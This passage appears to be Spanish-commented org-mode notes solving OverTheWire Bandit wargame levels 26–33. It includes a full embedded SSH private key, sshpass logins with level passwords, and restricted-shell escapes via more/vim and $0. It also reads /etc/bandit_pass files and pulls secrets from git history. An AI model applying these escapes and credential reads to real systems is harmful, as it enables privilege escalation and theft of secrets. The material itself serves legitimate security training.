/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
#+end_example

* Level 26

#+begin_src bash :results output verbatim
cat <<EOF > bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
EOF
chmod 500 bandit26.sshkey
ssh -o StrictHostKeyChecking=no -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220 /bin/bash <<EOF
Usar un terminal pequeño
En more, tecla v para editar con vim
En vim, cambiar la shell a /bin/bash
:set shell=/bin/bash
:! bash
EOF

#+end_src

Con la shell del 26:
#+begin_src bash
./bandit27-do  cat /etc/bandit_pass/*
#+end_src

#+begin_results
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
#+end_results

* Level 27
#+begin_src bash :results output verbatim
sshpass -p YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
cat repo/*
#+end_src

#+RESULTS:
: total 20
: drwxr-xr-x  2 root root 4096 Oct  5 06:19 .
: drwxr-xr-x 70 root root 4096 Oct  5 06:20 ..
: -rw-r--r--  1 root root  220 Jan  6  2022 .bash_logout
: -rw-r--r--  1 root root 3771 Jan  6  2022 .bashrc
: -rw-r--r--  1 root root  807 Jan  6  2022 .profile
: The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR


* Level 28

#+begin_src bash :results output verbatim
sshpass -p AVanL161y9rsbcJIsFHuw35rjaOM19nR ssh bandit28@bandit.labs.overthewire.org -p 2220 <<EOF
ls -la
EOF
#+end_src

#+begin_src bash :results output verbatim
rm -r repo
sshpass -p AVanL161y9rsbcJIsFHuw35rjaOM19nR git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
cat repo/*
#+end_src

#+RESULTS:
: # Bandit Notes
: Some notes for level29 of bandit.
: 
: ## credentials
: 
: - username: bandit29
: - password: xxxxxxxxxx
: 

Hay que usar la historia del git
* Level 29
#+begin_src bash :results output verbatim
rm -r repo
sshpass -p tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
cat repo/*
#+end_src

#+RESULTS:
: # Bandit Notes
: Some notes for bandit30 of bandit.
: 
: ## credentials
: 
: - username: bandit30
: - password: <no passwords in production!>
: 

Hay que usar la historia del git

xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

* Level 30
#+begin_src bash :results output verbatim
rm -r repo
sshpass -p xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
cat repo/*
pushd repo
sshpass -p xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS git fetch --tags origin
git show secret
popd
#+end_src

#+RESULTS:
: just an epmty file... muahaha
: ~/.emacs.d/repo ~/.emacs.d
: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
: ~/.emacs.d

* Level 31
#+begin_src bash :results output verbatim
rm -r repo
sshpass -p OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
pushd repo
sshpass -p OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt git fetch --tags origin
git log
popd
cat repo/*
pushd repo
echo "May I come in?" > key.txt
git add -f key.txt
git commit -m "May I come in?"
sshpass -p OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt git push origin master
#+end_src

#+RESULTS:
#+begin_example
~/.emacs.d/repo ~/.emacs.d
commit 12c8b5c836110b00471d51a3d59bfb5efc1d8020
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Oct 5 06:19:47 2023 +0000

    initial commit
~/.emacs.d
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

~/.emacs.d/repo ~/.emacs.d
[master 93e1235] May I come in?
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt

 rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
#+end_example

* Level 32
#+begin_src bash :results output verbatim
sshpass -p rmCBvG56y58BXzv98yZGdO7ATVL5dW8y ssh bandit32@bandit.labs.overthewire.org -p 2220 <<EOF
\$0 # por alguna razón no funciona así, tiene que ser interactivo
cat /etc/bandit_pass/bandit33
EOF
#+end_src

#+RESULTS:
: WELCOME TO THE UPPERCASE SHELL
: >> >> >>
: odHo63fHiFqcWWJG9rLiLDtPm45KzUKy

* Level 33
#+begin_src bash :results output verbatim
sshpass -p odHo63fHiFqcWWJG9rLiLDtPm45KzUKy ssh bandit33@bandit.labs.overthewire.org -p 2220 <<EOF
cat *
EOF
#+end_src

#+RESULTS:
: Congratulations on solving the last level of this game!
: 
: At this moment, there are no more levels to play in this game. However, we are constantly working
: on new levels and will most likely expand this game with more levels soon.
: Keep an eye out for an announcement on our usual communication channels!
: In the meantime, you could play some of our other wargames.
: 
: If you have an idea for an awesome new level, please let us know!
